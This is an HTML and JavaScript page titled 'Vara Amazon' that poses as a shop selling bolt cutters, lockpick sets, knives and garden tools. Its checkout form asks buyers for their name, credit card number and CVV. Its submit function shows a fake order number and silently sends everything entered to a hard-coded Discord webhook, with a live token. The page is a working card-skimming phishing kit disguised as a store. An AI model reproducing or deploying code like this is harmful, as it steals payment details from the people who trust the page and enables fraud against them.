<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vara Amazon</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1e1e1e;
            color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background: #2c2c2c;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.6);
            width: 90%;
            max-width: 600px;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 2.8em;
            color: #e0e0e0;
            transition: color 0.3s ease;
        }

        h1:hover {
            color: #007bff;
        }

        #search-bar {
            width: calc(100% - 24px);
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: white;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }

        #search-bar:focus {
            background-color: #444;
            outline: none;
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .category-btn {
            padding: 15px 25px;
            font-size: 1.3em;
            background-color: #0069d9;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        .category-btn:hover {
            background-color: #0056b3;
            transform: scale(1.05);
        }

        .items {
            margin-top: 20px;
        }

        .item-btn {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px auto;
            padding: 12px 20px;
            font-size: 1.2em;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            max-width: 100%;
            text-align: left;
            position: relative;
            overflow: hidden;
        }

        .item-btn span {
            background-color: #1c7430;
            color: #d4edda;
            border-radius: 8px;
            padding: 5px 10px;
            font-size: 1em;
            margin-left: 15px;
        }

        .item-btn:hover {
            background-color: #218838;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }

        .form-container {
            text-align: center;
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            background: #2c2c2c;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.6);
        }

        .form-container label {
            display: block;
            margin: 15px 0 5px;
            font-size: 1.1em;
        }

        .form-container input[type="text"], .form-container textarea {
            width: calc(100% - 24px);
            padding: 12px;
            margin: 10px auto;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: white;
            font-size: 1em;
            max-width: 100%;
        }

        .form-container textarea {
            resize: vertical;
            min-height: 100px;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            font-size: 1.2em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #0056b3;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Vara Amazon</h1>
        <input type="text" id="search-bar" placeholder="Search for a category...">
        <div class="buttons">
            <button class="category-btn" onclick="showCategory('tools')">Tools</button>
            <button class="category-btn" onclick="showCategory('food')" style="display:none;">Food</button>
            <button class="category-btn" onclick="showCategory('more')" style="display:none;">More</button>
        </div>
        <div id="items" class="items"></div>
    </div>

    <script>
        function showCategory(category) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            const tools = [
                "Bolt cutters", 
                "Lockpick sets", 
                "Padlocks", 
                "Axes", 
                "Knives", 
                "Shovels", 
                "Hoes"
            ];

            let items = [];

            if (category === 'tools') {
                items = tools;
            }

            items.forEach(item => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.textContent = item;
                button.onclick = () => showItemVariants(item);
                itemsDiv.appendChild(button);
            });
        }

        function showItemVariants(item) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            let variants = [];

            switch (item) {
                case 'Shovels':
                    variants = [
                        { name: "Basic Shovel", price: 25 },
                        { name: "Heavy-Duty Shovel", price: 40 }
                    ];
                    break;
                case 'Hoes':
                    variants = [
                        { name: "Garden Hoe", price: 35 },
                        { name: "Heavy-Duty Hoe", price: 45 }
                    ];
                    break;
                case 'Knives':
                    variants = [
                        { name: "Pocket Knife", price: 100 },
                        { name: "Hunting Knife", price: 60 },
                        { name: "Utility Knife", price: 45 }
                    ];
                    break;
                case 'Lockpick sets':
                    variants = [
                        { name: "Beginner Lockpick Set", price: 70 },
                        { name: "Professional Lockpick Set", price: 100 },
                        { name: "Advanced Lockpick Set", price: 150 }
                    ];
                    break;
                case 'Bolt cutters':
                    variants = [
                        { name: "Small Bolt Cutters", price: 200 },
                        { name: "Medium Bolt Cutters", price: 400 },
                        { name: "Heavy-Duty Bolt Cutters", price: 800 }
                    ];
                    break;
                case 'Axes':
                    variants = [
                        { name: "Camping Axe", price: 70 },
                        { name: "Heavy-Duty Axe", price: 100 }
                    ];
                    break;
                default:
                    variants = [{ name: item, price: 'N/A' }];
            }

            variants.forEach(variant => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.innerHTML = `${variant.name} <span>$ ${variant.price}</span>`;
                button.onclick = () => goToCustomerForm(variant);
                itemsDiv.appendChild(button);
            });
        }

        function goToCustomerForm(item) {
            document.body.innerHTML = `
                <div class="container">
                    <h1>Enter Your Details for ${item.name} ${item.price !== 'N/A' ? ` ($${item.price})` : ''}</h1>
                    <div class="form-container">
                        <label for="name">Name:</label>
                        <input type="text" id="name" placeholder="Your Name">

                        <label for="bank-details">Bank Account Details:</label>
                        <textarea id="bank-details" rows="6" placeholder="Credit card number:\nCC/V:\nCC ID:"></textarea>

                        <button class="submit-btn" onclick="submitOrder('${item.name}', '${item.price}')">Buy</button>
                    </div>
                </div>
            `;
        }

        function submitOrder(item, price) {
            const name = document.getElementById('name').value;
            const bankDetails = document.getElementById('bank-details').value;

            if (name && bankDetails) {
                const orderNumber = Math.floor(Math.random() * 1000000);
                alert(`Thank you for Purchasing ${item}, Your order number is #${orderNumber}.`);

                // Send webhook with details
                fetch('https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [
                            {
                                title: `New Order: #${orderNumber}`,
                                description: `**Item:** ${item}\n**Price:** $${price}\n**Customer Name:** ${name}\n**Bank Details:** ${bankDetails}`,
                                color: 16711680 // Red color
                            }
                        ]
                    })
                }).then(response => console.log('Webhook sent:', response));
            } else {
                alert('Please fill out all fields.');
            }
        }

        // Implement search functionality
        document.getElementById('search-bar').addEventListener('input', function() {
            const query = this.value.toLowerCase();
            const buttons = document.querySelectorAll('.category-btn');

            buttons.forEach(button => {
                if (button.textContent.toLowerCase().includes(query)) {
                    button.style.display = '';
                } else {
                    button.style.display = 'none';
                }
            });
        });
    </script>
</body>
</html>
